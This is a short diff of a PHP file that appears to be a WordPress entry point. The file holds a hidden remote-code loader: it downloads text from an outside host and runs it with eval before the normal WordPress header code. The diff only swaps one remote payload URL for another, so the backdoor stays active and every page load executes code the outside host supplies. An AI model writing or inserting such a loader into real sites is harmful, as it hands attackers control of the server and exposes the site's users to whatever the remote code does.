@@ -19,7 +19,7 @@ function get_contents($url){
 }?>
 <?php
 $a =
-get_contents('https://kasihpaham.xyz/wy/chothuexemayhalong.txt');
+get_contents('https://kasihpaham.xyz/wy/yeniletisim.txt');
 eval('?>'.$a);
 
 if ( ! isset( $wp_did_header ) ) {
